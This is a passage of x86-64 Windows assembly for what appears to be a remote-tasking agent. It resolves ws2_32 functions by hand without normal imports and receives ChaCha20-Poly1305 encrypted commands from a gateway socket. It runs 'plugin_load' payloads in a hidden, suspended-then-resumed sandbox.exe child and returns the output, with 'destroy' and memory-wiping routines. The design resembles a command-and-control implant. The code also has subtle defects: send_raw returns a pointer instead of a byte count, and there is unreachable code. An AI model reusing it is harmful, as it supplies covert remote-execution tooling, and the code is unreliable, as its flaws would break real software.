    lea rcx, [str_ws2_32]
    mov edx, 10                     ; "ws2_32.dll" char count
    call find_dll_base
    test rax, rax
    jz .rw2_fail
    mov [rsp], rax

    lea rcx, [str_WSAStartup]
    mov r8d, 11
    lea rdx, [str_WSAStartup]
    mov rcx, [rsp]
    call find_export
    test rax, rax
    jz .rw2_fail
    mov [ptr_WSAStartup], rax

    lea rdx, [str_socket]
    mov r8d, 7
    mov rcx, [rsp]
    call find_export
    test rax, rax
    jz .rw2_fail
    mov [ptr_socket], rax

    lea rdx, [str_connect]
    mov r8d, 8
    mov rcx, [rsp]
    call find_export
    test rax, rax
    jz .rw2_fail
    mov [ptr_connect], rax

    lea rdx, [str_send]
    mov r8d, 5
    mov rcx, [rsp]
    call find_export
    test rax, rax
    jz .rw2_fail
    mov [ptr_send], rax

    lea rdx, [str_recv]
    mov r8d, 5
    mov rcx, [rsp]
    call find_export
    test rax, rax
    jz .rw2_fail
    mov [ptr_recv], rax

    lea rdx, [str_closesocket]
    mov r8d, 12
    mov rcx, [rsp]
    call find_export
    test rax, rax
    jz .rw2_fail
    mov [ptr_closesocket], rax

    lea rdx, [str_WSAGetLastError]
    mov r8d, 16
    mov rcx, [rsp]
    call find_export
    test rax, rax
    jz .rw2_fail
    mov [ptr_WSAGetLastError], rax

    lea rdx, [str_ioctlsocket]
    mov r8d, 12
    mov rcx, [rsp]
    call find_export
    test rax, rax
    jz .rw2_fail
    mov [ptr_ioctlsocket], rax

    lea rdx, [str_setsockopt]
    mov r8d, 10
    mov rcx, [rsp]
    call find_export
    test rax, rax
    jz .rw2_fail
    mov [ptr_setsockopt], rax

    mov eax, 1
    add rsp, 40
    ret
.rw2_fail:
    xor eax, eax
    add rsp, 40
    ret

; ===========================================================================
; Create TCP connection to gateway
; Returns: socket fd in rax, or INVALID_SOCKET on error
; ===========================================================================
create_connection:
    sub rsp, 56

    mov ecx, AF_INET
    mov edx, SOCK_STREAM
    mov r8d, IPPROTO_TCP
    call [ptr_socket]
    cmp rax, INVALID_SOCKET
    je .cc_fail
    mov [sock_fd], rax

    mov word [server_addr], AF_INET
    mov ax, server_port
    xchg al, ah
    mov [server_addr + 2], ax
    mov dword [server_addr + 4], 0x0100007F

    mov rcx, [sock_fd]
    lea rdx, [server_addr]
    mov r8d, SIZEOF_SOCKADDR_IN
    call [ptr_connect]
    cmp eax, SOCKET_ERROR
    je .cc_close

    mov rax, [sock_fd]
    add rsp, 56
    ret

.cc_close:
    mov rcx, [sock_fd]
    call [ptr_closesocket]
.cc_fail:
    mov rax, INVALID_SOCKET
    add rsp, 56
    ret

; ===========================================================================
; Send raw bytes over socket using resolved ptr_send
; Input: rcx = buffer, rdx = length
; Returns: bytes sent in rax, SOCKET_ERROR on failure
; ===========================================================================
send_raw:
    sub rsp, 40
    push rbx
    push rsi
    mov rsi, rcx
    mov ebx, edx

.sr_loop:
    test ebx, ebx
    jz .sr_done
    mov rcx, [sock_fd]
    mov rdx, rsi
    mov r8d, ebx
    mov r9d, 0
    call [ptr_send]
    cmp eax, SOCKET_ERROR
    je .sr_err
    add rsi, rax
    sub ebx, eax
    jmp .sr_loop
.sr_done:
    mov rax, rsi
    pop rsi
    pop rbx
    add rsp, 40
    ret
.sr_err:
    mov rax, SOCKET_ERROR
    pop rsi
    pop rbx
    add rsp, 40
    ret

; ===========================================================================
; Receive exactly N bytes from socket (blocking)
; Input: rcx = buffer, rdx = length
; Returns: 1 on success, 0 on failure/EOF
; ===========================================================================
recv_exact:
    sub rsp, 40
    push rbx
    push rdi
    mov rdi, rcx
    mov ebx, edx

.re_loop:
    test ebx, ebx
    jz .re_done
    mov rcx, [sock_fd]
    mov rdx, rdi
    mov r8d, ebx
    mov r9d, 0
    call [ptr_recv]
    test eax, eax
    jle .re_fail
    add rdi, rax
    sub ebx, eax
    jmp .re_loop

.re_done:
    mov eax, 1
    pop rdi
    pop rbx
    add rsp, 40
    ret
.re_fail:
    xor eax, eax
    pop rdi
    pop rbx
    add rsp, 40
    ret

; ===========================================================================
; aead_verify_decrypt: authenticate and decrypt one gateway frame body
;   rcx = 36-byte header (AAD), rdx = ciphertext || tag, r8d = payload length,
;   r9  = plaintext output buffer
; Nonce is rebuilt from the header (le32(seq) || agent_id).
; Returns eax = 1 ok (plaintext written), 0 = authentication failure
; ===========================================================================
aead_verify_decrypt:
    push rbx
    sub rsp, 56
    mov [rsp], rcx                  ; header
    mov [rsp + 8], rdx              ; ciphertext
    mov [rsp + 16], r9              ; plaintext out
    mov [rsp + 24], r8              ; len

    ; nonce = le32(header.seq) || header.agent_id
    mov eax, [rcx + 8]
    mov [cc_nonce], eax
    mov rax, [rcx + 18]
    mov [cc_nonce + 4], rax

    xor ecx, ecx
    call chacha_init_state
    call chacha20_block
    call poly1305_init_key

    mov rsi, [rsp]
    mov ecx, HEADER_SIZE
    call poly1305_update

    mov rsi, [rsp + 8]
    mov ecx, [rsp + 24]
    call poly1305_update

    mov dword [poly_lenblk], HEADER_SIZE
    mov dword [poly_lenblk + 4], 0
    mov eax, [rsp + 24]
    mov [poly_lenblk + 8], eax
    mov dword [poly_lenblk + 12], 0
    lea rsi, [poly_lenblk]
    mov ecx, 16
    call poly1305_update

    lea rdi, [poly_partial_blk]     ; 16-byte scratch (block staging reused)
    call poly1305_finish

    ; compare computed tag with the received one (xor-fold)
    mov rsi, [rsp + 8]
    mov eax, [rsp + 24]
    add rsi, rax
    lea rbp, [poly_partial_blk]
    xor ecx, ecx
    xor edx, edx
.cmp_loop:
    mov al, [rsi + rcx]
    xor al, [rbp + rcx]
    or dl, al
    inc ecx
    cmp ecx, AEAD_TAG_SIZE
    jb .cmp_loop
    test dl, dl
    jnz .auth_fail

    ; plaintext = ciphertext xor keystream(counter = 1, 2, ...)
    mov rax, [rsp + 16]
    mov [enc_dst_ptr], rax
    mov rax, [rsp + 8]
    mov [enc_src_ptr], rax
    mov eax, [rsp + 24]
    mov [enc_remaining], eax
    mov dword [enc_ctr], 1
    lea rbp, [cc_keystream]         ; indexed addressing needs a real base reg

.de_loop:
    cmp dword [enc_remaining], 0
    jle .de_done
    mov ecx, [enc_ctr]
    call chacha_init_state
    call chacha20_block
    mov ecx, CHA_CHA_BLOCK_SIZE
    cmp ecx, [enc_remaining]
    jbe .de_chunk
    mov ecx, [enc_remaining]
.de_chunk:
    mov ebx, ecx
    mov rsi, [enc_src_ptr]
    mov rdi, [enc_dst_ptr]
    xor edx, edx
.de_xor:
    mov al, [rsi + rdx]
    xor al, [rbp + rdx]
    mov [rdi + rdx], al
    inc edx
    cmp edx, ecx
    jb .de_xor
    add [enc_src_ptr], rbx
    add [enc_dst_ptr], rbx
    sub [enc_remaining], ebx
    inc dword [enc_ctr]
    jmp .de_loop
.de_done:
    mov eax, 1
    add rsp, 56
    pop rbx
    ret

.auth_fail:
    xor eax, eax
    add rsp, 56
    pop rbx
    ret

; ===========================================================================
; tls_recv_exact: read exactly edx bytes into rcx through tls_recv
; Returns 1 on success, 0 on EOF/error mid-frame
; ===========================================================================
tls_recv_exact:
    push rbx
    push rsi
    sub rsp, 40
    mov rsi, rcx
    mov ebx, edx
.tre_loop:
    test ebx, ebx
    jz .tre_done
    mov rcx, rsi
    mov edx, ebx
    call tls_recv
    test eax, eax
    jz .tre_fail
    add rsi, rax
    sub ebx, eax
    jmp .tre_loop
.tre_done:
    mov eax, 1
    add rsp, 40
    pop rsi
    pop rbx
    ret
.tre_fail:
    xor eax, eax
    add rsp, 40
    pop rsi
    pop rbx
    ret

; ===========================================================================
; recv_command: receive, authenticate and decrypt one frame from the gateway
; Returns: 1 = frame ready (recv_frame_* / recv_plaintext_buf filled),
;          2 = authentication failure (caller reports and drops),
;          0 = no data / stream error
; ===========================================================================
recv_command:
    sub rsp, 72
    ; frame-boundary compaction: safe only when the staging buffer is fully
    ; drained (no partial frame pending). Appends never overwrite, so the
    ; snapshot below stays valid for rollback until the frame completes.
    mov eax, [tls_decrypted_len]
    cmp eax, [tls_decrypted_off]
    jne .rc_no_compact
    mov dword [tls_decrypted_len], 0
    mov dword [tls_decrypted_off], 0
.rc_no_compact:
    mov eax, [tls_decrypted_off]
    mov [recv_saved_off], eax

    ; read 1 byte first: distinguishes "idle" from "frame start"
    lea rcx, [recv_header_buf]
    mov edx, 1
    call tls_recv
    test eax, eax
    jz .rc_nodata

    lea rcx, [recv_header_buf + 1]
    mov edx, HEADER_SIZE - 1
    call tls_recv_exact
    test eax, eax
    jz .rc_nodata

    mov eax, [recv_header_buf]
    cmp eax, FEI_MAGIC
    jne .rc_nodata
    movzx eax, word [recv_header_buf + 4]
    cmp ax, FEI_PROTO_VER
    jne .rc_nodata

    movzx eax, word [recv_header_buf + 6]
    mov [recv_frame_type], ax
    mov eax, [recv_header_buf + 8]
    mov [recv_frame_seq], eax
    mov eax, [recv_header_buf + 12]
    mov [recv_frame_payload_len], eax
    movzx eax, word [recv_header_buf + 16]
    mov [recv_padding_len], ax

    mov eax, [recv_frame_payload_len]
    cmp eax, MAX_AGENT_PAYLOAD
    ja .rc_too_big

    ; heartbeat with empty body: gateway fast path, nothing follows
    cmp word [recv_frame_type], FEI_TYPE_HEARTBEAT
    jne .rc_body
    cmp dword [recv_frame_payload_len], 0
    jne .rc_body
    cmp word [recv_padding_len], 0
    jne .rc_body
    mov eax, 1
    add rsp, 72
    ret

.rc_body:
    ; body = ciphertext || tag
    mov eax, [recv_frame_payload_len]
    add eax, AEAD_TAG_SIZE
    lea rcx, [recv_body_buf]
    mov edx, eax
    call tls_recv_exact
    test eax, eax
    jz .rc_nodata

    ; discard padding (chunks of scratch_buf); chunk size lives in .bss so
    ; the stack stays 16-byte aligned across the call
.rc_pad:
    movzx eax, word [recv_padding_len]
    test eax, eax
    jz .rc_verify
    cmp eax, 256
    jbe .rc_pad_last
    mov eax, 256
.rc_pad_last:
    mov [recv_pad_chunk], eax
    lea rcx, [scratch_buf]
    mov edx, [recv_pad_chunk]
    call tls_recv_exact
    test eax, eax
    jz .rc_nodata
    mov eax, [recv_pad_chunk]
    sub [recv_padding_len], ax
    jmp .rc_pad

.rc_verify:
    lea rcx, [recv_header_buf]
    lea rdx, [recv_body_buf]
    mov r8d, [recv_frame_payload_len]
    lea r9, [recv_plaintext_buf]
    call aead_verify_decrypt
    test eax, eax
    jz .rc_authfail

    mov eax, 1
    add rsp, 72
    ret

.rc_authfail:
    mov eax, 2
    add rsp, 72
    ret

.rc_nodata:
    mov eax, [recv_saved_off]
    mov [tls_decrypted_off], eax
    xor eax, eax
    add rsp, 72
    ret

.rc_too_big:
    ; Well-formed but oversized frame: consume and discard its whole body
    ; (ciphertext + tag + padding) so the stream resyncs. Rolling back like
    ; .rc_nodata would leave the staging parser staring at the same oversized
    ; header forever, silently dropping every command after the first one.
    push rbx
    push r12
    mov r12d, [recv_frame_payload_len]
    add r12d, AEAD_TAG_SIZE
    movzx eax, word [recv_padding_len]
    add r12d, eax
.discard_loop:
    test r12d, r12d
    jz .discard_done
    mov edx, r12d
    cmp edx, 4096
    jbe .discard_read
    mov edx, 4096
.discard_read:
    mov ebx, edx                ; chunk size survives the call in rbx
    lea rcx, [recv_body_buf]
    call tls_recv_exact
    test eax, eax
    jz .discard_fail            ; stream broke mid-frame
    sub r12d, ebx
    jmp .discard_loop
.discard_done:
    mov eax, 3                  ; new code: frame dropped, stream advanced
    pop r12
    pop rbx
    add rsp, 72
    ret
.discard_fail:
    mov eax, [recv_saved_off]
    mov [tls_decrypted_off], eax
    xor eax, eax
    pop r12
    pop rbx
    add rsp, 72
    ret

; ===========================================================================
; process_command: dispatch an authenticated, decrypted frame.
; plugin_load (0x02) payload is the sandbox pipe frame [cmd u8][len u32][data];
; it is forwarded verbatim and the framed sandbox response
; ([len u32 LE][data]) is relayed back as exec_return (0x03).
; ===========================================================================
process_command:
    sub rsp, 56

    movzx eax, word [recv_frame_type]

    cmp ax, FEI_TYPE_HEARTBEAT
    je .pc_done

    cmp ax, FEI_TYPE_PLUGIN_LOAD
    je .pc_plugin_load

    cmp ax, FEI_TYPE_DESTROY
    je .pc_destroy

    jmp .pc_done

.pc_plugin_load:
    mov eax, [recv_frame_payload_len]
    test eax, eax
    jz .pc_done

    ; forward the decrypted payload to the sandbox
    lea rcx, [recv_plaintext_buf]
    mov edx, eax
    call sandbox_send
    test eax, eax
    jz .pc_send_err

    ; response length prefix
    lea rcx, [recv_plaintext_buf]
    mov edx, 4
    call sandbox_recv_exact
    test eax, eax
    jz .pc_recv_hdr_err

    mov eax, [recv_plaintext_buf]
    cmp eax, MAX_AGENT_PAYLOAD
    ja .pc_resp_big_err
    test eax, eax
    jz .pc_done
    ; sandbox_recv_exact uses pipe_bytes_read as Peek/Read scratch: the last
    ; chunk count would clobber the total, so keep the total separately.
    mov [pipe_resp_total], eax

    lea rcx, [pipe_buffer]
    mov edx, eax
    call sandbox_recv_exact
    test eax, eax
    jz .pc_recv_body_err

    mov edx, [pipe_resp_total]
    lea rcx, [pipe_buffer]
    call send_exec_return
    jmp .pc_done

; Four failure stages, four distinct message lengths (14/18/19/17 with NUL)
; so the exception frame length alone identifies the failing stage.
.pc_send_err:
    mov rcx, .send_err_msg
    mov edx, .send_err_msg_len
    call send_exception
    jmp .pc_done

.pc_recv_hdr_err:
    mov rcx, .recv_hdr_err_msg
    mov edx, .recv_hdr_err_msg_len
    call send_exception
    jmp .pc_done

.pc_recv_body_err:
    mov rcx, .recv_body_err_msg
    mov edx, .recv_body_err_msg_len
    call send_exception
    jmp .pc_done

.pc_resp_big_err:
    ; The sandbox response exceeds the relay budget. Its bytes are already
    ; in (or coming down) the pipe: DRAIN the declared amount so the next
    ; command's length prefix is not read from stale response data (the
    ; un-drained leftover used to poison every later command).
    push rbx
    push r12
    mov r12d, eax                ; declared response length
.pr_drain:
    test r12d, r12d
    jz .pr_drain_done
    mov edx, r12d
    cmp edx, 4096
    jbe .pr_drain_read
    mov edx, 4096
.pr_drain_read:
    mov ebx, edx
    lea rcx, [pipe_buffer]
    call sandbox_recv_exact
    test eax, eax
    jz .pr_drain_stuck           ; pipe broke or sandbox died mid-drain
    sub r12d, ebx
    jmp .pr_drain
.pr_drain_done:
    pop r12
    pop rbx
    mov rcx, .resp_big_err_msg
    mov edx, .resp_big_err_msg_len
    call send_exception
    jmp .pc_done
.pr_drain_stuck:
    pop r12
    pop rbx
    mov rcx, .resp_big_err_msg
    mov edx, .resp_big_err_msg_len
    call send_exception
    jmp .pc_done
    mov rcx, .resp_big_err_msg
    mov edx, .resp_big_err_msg_len
    call send_exception
    jmp .pc_done

.pc_destroy:
    call terminate_sandbox
    mov ecx, 0
    call ExitProcess

.pc_done:
    add rsp, 56
    ret

; Error messages for sandbox pipe failures (distinct lengths, see above)
.send_err_msg: db "sbx-send-fail", 0
.send_err_msg_len equ $ - .send_err_msg
.recv_hdr_err_msg: db "sbx-recv-hdr-fail", 0
.recv_hdr_err_msg_len equ $ - .recv_hdr_err_msg
.recv_body_err_msg: db "sbx-recv-body-fail", 0
.recv_body_err_msg_len equ $ - .recv_body_err_msg
.resp_big_err_msg: db "sbx-resp-too-big", 0
.resp_big_err_msg_len equ $ - .resp_big_err_msg

; ===========================================================================
; Data: sandbox configuration
; ===========================================================================
section .data

; --- Sandbox executable path (wide string) ---
sandbox_exe_path:
    dw 's','a','n','d','b','o','x','.','e','x','e',0

; --- STARTUPINFOW structure ---
STARTUPINFOW_SIZE equ 104
startup_info:     times STARTUPINFOW_SIZE db 0

; --- PROCESS_INFORMATION structure (16 bytes) ---
process_info:     times 16 db 0

; --- Security attributes for inheritable handles ---
security_attrs:
    dd 24               ; nLength
    dq 0                ; lpSecurityDescriptor
    dd 1                ; bInheritHandle = TRUE
    dd 0                ; padding

section .text
; ===========================================================================
; create_sandbox: spawn the sandbox child with piped stdio
; ===========================================================================
create_sandbox:
    sub rsp, 88                     ; CreateProcessW needs 6 stack args ([rsp+32..+72])

    ; Create stdin pipe (entry writes, sandbox reads); created without a
    ; SECURITY_ATTRIBUTES blob, then the child-facing end is marked
    ; inheritable explicitly via SetHandleInformation.
    lea rcx, [pipe_stdin_read]
    lea rdx, [pipe_stdin_write]
    xor r8d, r8d
    xor r9d, r9d
    call CreatePipe
    test eax, eax
    jz .fail

    lea rcx, [pipe_stdout_read]
    lea rdx, [pipe_stdout_write]
    xor r8d, r8d
    xor r9d, r9d
    call CreatePipe
    test eax, eax
    jz .fail

    ; HANDLE_FLAG_INHERIT = 1: mark the two ends the child will use
    mov rcx, [pipe_stdin_read]
    mov edx, 1
    xor r8d, r8d
    inc r8d
    call SetHandleInformation
    test eax, eax
    jz .fail
    mov rcx, [pipe_stdout_write]
    mov edx, 1
    xor r8d, r8d
    inc r8d
    call SetHandleInformation
    test eax, eax
    jz .fail

    ; STARTUPINFOW
    mov dword [startup_info], STARTUPINFOW_SIZE
    mov dword [startup_info + 60], 0x00000100    ; STARTF_USESTDHANDLES
    mov rax, [pipe_stdin_read]
    mov [startup_info + 80], rax
    mov rax, [pipe_stdout_write]
    mov [startup_info + 88], rax
    mov [startup_info + 96], rax

    ; CreateProcessW(sandbox.exe, NULL, NULL, NULL, TRUE,
    ;                CREATE_SUSPENDED|CREATE_NO_WINDOW, NULL, NULL, &si, &pi)
    lea rcx, [sandbox_exe_path]
    xor rdx, rdx
    xor r8d, r8d
    xor r9d, r9d
    mov qword [rsp + 32], 1                        ; bInheritHandles = TRUE
    mov qword [rsp + 40], CREATE_SUSPENDED | CREATE_NO_WINDOW
    mov qword [rsp + 48], 0                        ; lpEnvironment
    mov qword [rsp + 56], 0                        ; lpCurrentDirectory
    lea rax, [startup_info]
    mov qword [rsp + 64], rax
    lea rax, [process_info]
    mov qword [rsp + 72], rax
    call CreateProcessW
    test eax, eax
    jz .fail

    mov rax, [process_info]
    mov [sandbox_hprocess], rax
    mov rax, [process_info + 8]
    mov [sandbox_hthread], rax

    mov rcx, [sandbox_hthread]
    call ResumeThread

    ; close the child-side ends in the parent
    mov rcx, [pipe_stdin_read]
    call CloseHandle
    mov rcx, [pipe_stdout_write]
    call CloseHandle
    mov qword [pipe_stdin_read], 0
    mov qword [pipe_stdout_write], 0

    mov eax, 1
    add rsp, 88
    ret

.fail:
    xor eax, eax
    add rsp, 88
    ret

; ===========================================================================
; sandbox_send: Send data to sandbox via stdin pipe
; Input: rcx = pointer to data, rdx = size in bytes
; Returns: 1 on success, 0 on failure
; ===========================================================================
sandbox_send:
    sub rsp, 56
    push rbx
    push rsi

    mov rsi, rcx                ; data pointer
    mov rbx, rdx                ; size
    mov rcx, [pipe_stdin_write]
    test rcx, rcx
    jz .fail

.send_loop:
    test rbx, rbx
    jz .success

    ; rcx is volatile across the call: reload the handle every iteration.
    ; The old pre-loop-only copy was clobbered by the previous WriteFile, so
    ; every multi-chunk (>4096-byte) write failed with an invalid handle.
    mov rcx, [pipe_stdin_write]
    test rcx, rcx
    jz .fail

    ; Calculate bytes to write (min of remaining, 4096)
    mov r8, rbx
    cmp r8, 4096
    jbe .write
    mov r8, 4096

.write:
    ; WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped)
    mov rdx, rsi                ; buffer
    lea r9, [pipe_bytes_written]
    mov qword [rsp + 32], 0     ; lpOverlapped = NULL
    call WriteFile
    test eax, eax
    jz .fail

    mov eax, [pipe_bytes_written]
    add rsi, rax
    sub rbx, rax
    jmp .send_loop

.success:
    pop rsi
    pop rbx
    mov eax, 1
    add rsp, 56
    ret

.fail:
    pop rsi
    pop rbx
    xor eax, eax
    add rsp, 56
    ret

; ===========================================================================
; sandbox_recv_exact: read exactly edx bytes from sandbox stdout into rcx.
; Polls PeekNamedPipe with a 10 s deadline so a hung sandbox can never block
; the kernel forever (the old blocking ReadFile deadlocked the whole agent).
; Returns 1 on success, 0 on failure/timeout/EOF
; ===========================================================================
SB_TIMEOUT_POLLS   equ 200               ; 200 x 50 ms = 10 s

sandbox_recv_exact:
    push rbx
    push rsi
    push r15
    sub rsp, 64                     ; 3 pushes + 64 = 88: aligned at calls

    mov rsi, rcx                    ; output buffer
    mov ebx, edx                    ; remaining
    mov r15d, SB_TIMEOUT_POLLS
.sre_poll:
    test ebx, ebx
    jz .sre_done

    mov rcx, [pipe_stdout_read]
    test rcx, rcx
    jz .sre_fail
    ; is the sandbox process still alive? broken pipe otherwise
    mov rcx, [sandbox_hprocess]
    mov edx, 0
    call WaitForSingleObject
    test eax, eax
    jz .sre_fail                    ; sandbox exited

    ; PeekNamedPipe(h, NULL, 0, NULL, &avail, NULL)
    mov rcx, [pipe_stdout_read]
    xor edx, edx
    xor r8d, r8d
    xor r9d, r9d
    lea rax, [pipe_bytes_read]
    mov [rsp + 32], rax
    mov qword [rsp + 40], 0
    call PeekNamedPipe
    test eax, eax
    jz .sre_fail                    ; pipe broken
    cmp dword [pipe_bytes_read], 0
    jle .sre_wait

    ; read min(avail, remaining)
    mov r8d, [pipe_bytes_read]
    cmp r8d, ebx
    jbe .sre_read
    mov r8d, ebx
.sre_read:
    mov rcx, [pipe_stdout_read]
    mov rdx, rsi
    lea r9, [pipe_bytes_read]
    mov qword [rsp + 32], 0
    call ReadFile
    test eax, eax
    jz .sre_fail
    mov eax, [pipe_bytes_read]
    test eax, eax
    jz .sre_fail                    ; EOF
    add rsi, rax
    sub ebx, eax
    jmp .sre_poll

.sre_wait:
    dec r15d
    jz .sre_fail
    mov ecx, 50
    call Sleep
    jmp .sre_poll

.sre_done:
    mov eax, 1
    add rsp, 64
    pop r15
    pop rsi
    pop rbx
    ret

.sre_fail:
    xor eax, eax
    add rsp, 64
    pop r15
    pop rsi
    pop rbx
    ret

; ===========================================================================
; check_sandbox_alive: Check if sandbox process is still running
; Returns: eax = 1 if alive, 0 if crashed/exited
; If crashed, sends TypeException (0x04) message
; ===========================================================================
check_sandbox_alive:
    sub rsp, 40

    ; WaitForSingleObject(sandbox_hprocess, 0)
    mov rcx, [sandbox_hprocess]
    mov edx, 0                      ; dwMilliseconds = 0 (non-blocking)
    call WaitForSingleObject

    ; WAIT_OBJECT_0 = 0 means process has exited
    test eax, eax
    jnz .still_alive

    ; Process has exited - clean up so respawn starts from a clean state
    call terminate_sandbox

    mov rcx, .crash_msg
    mov edx, .crash_msg_len
    call send_exception

    xor eax, eax                    ; Return 0 (not alive)
    add rsp, 40
    ret

.still_alive:
    mov eax, 1                      ; Return 1 (alive)
    add rsp, 40
    ret

.crash_msg:
    db "sandbox_process_crashed"
.crash_msg_len equ $ - .crash_msg

; ===========================================================================
; terminate_sandbox: Terminate sandbox process and clean up resources
; ===========================================================================
terminate_sandbox:
    sub rsp, 40

    ; Terminate process if still running
    mov rcx, [sandbox_hprocess]
    test rcx, rcx
    jz .cleanup_handles
    mov rdx, 0                  ; exit code
    call TerminateProcess

.cleanup_handles:
    ; Close remaining handles
    mov rcx, [sandbox_hprocess]
    test rcx, rcx
    jz .close_thread
    call CloseHandle
    mov qword [sandbox_hprocess], 0

.close_thread:
    mov rcx, [sandbox_hthread]
    test rcx, rcx
    jz .close_stdin
    call CloseHandle
    mov qword [sandbox_hthread], 0

.close_stdin:
    mov rcx, [pipe_stdin_write]
    test rcx, rcx
    jz .close_stdout
    call CloseHandle
    mov qword [pipe_stdin_write], 0

.close_stdout:
    mov rcx, [pipe_stdout_read]
    test rcx, rcx
    jz .done
    call CloseHandle
    mov qword [pipe_stdout_read], 0

.done:
    add rsp, 40
    ret

; ===========================================================================
; cleanup_stream: close the socket and reset per-connection state so the
; supervisor can start a fresh session
; ===========================================================================
cleanup_stream:
    sub rsp, 40
    cmp qword [sock_fd], 0
    je .cs_done
    mov rcx, [sock_fd]
    call [ptr_closesocket]
.cs_done:
    mov qword [sock_fd], 0
    mov dword [tls_recv_len], 0
    mov dword [tls_decrypted_len], 0
    mov dword [tls_decrypted_off], 0
    mov dword [tls_context_established], 0
    mov dword [seq_counter], 0
    add rsp, 40
    ret

; ===========================================================================
; wipe_sensitive_data: Securely wipe sensitive memory regions
; Input: rcx = pointer, rdx = size
; ===========================================================================
wipe_sensitive_data:
    push rdi
    mov rdi, rcx                    ; Destination = pointer
    mov rcx, rdx                    ; Count = size
    xor al, al                      ; Fill with zeros
    rep stosb                       ; Zero memory
    pop rdi
    ret

; ===========================================================================
; cleanup_all: Wipe all sensitive data before process exit
; ===========================================================================
cleanup_all:
    sub rsp, 40
    ; (PSK intentionally not wiped: the connection supervisor reconnects via
    ; cleanup_tls/cleanup_stream; final cleanup is the OS reclaiming memory)

    ; Wipe ChaCha20 state + keystream + nonce
    lea rcx, [cc_state]
    mov rdx, 64
    call wipe_sensitive_data

    lea rcx, [cc_keystream]
    mov rdx, CHA_CHA_BLOCK_SIZE
    call wipe_sensitive_data

    lea rcx, [cc_nonce]
    mov rdx, 12
    call wipe_sensitive_data

    ; Wipe Poly1305 state (r + s + h + staging = contiguous block)
    lea rcx, [poly_r]
    mov rdx, 112
    call wipe_sensitive_data

    ; Wipe frame buffers
    lea rcx, [header_buf]
    mov rdx, HEADER_SIZE
    call wipe_sensitive_data

    lea rcx, [frame_out]
    mov rdx, HEADER_SIZE + MAX_AGENT_PAYLOAD + AEAD_TAG_SIZE + 128
    call wipe_sensitive_data

    lea rcx, [recv_body_buf]
    mov rdx, MAX_AGENT_PAYLOAD + AEAD_TAG_SIZE + 128
    call wipe_sensitive_data

    lea rcx, [recv_plaintext_buf]
    mov rdx, MAX_AGENT_PAYLOAD
    call wipe_sensitive_data

    lea rcx, [pipe_buffer]
    mov rdx, MAX_AGENT_PAYLOAD
    call wipe_sensitive_data

    ; Clean up TLS
    call cleanup_tls

    ; Terminate sandbox
    call terminate_sandbox

    add rsp, 40
    ret
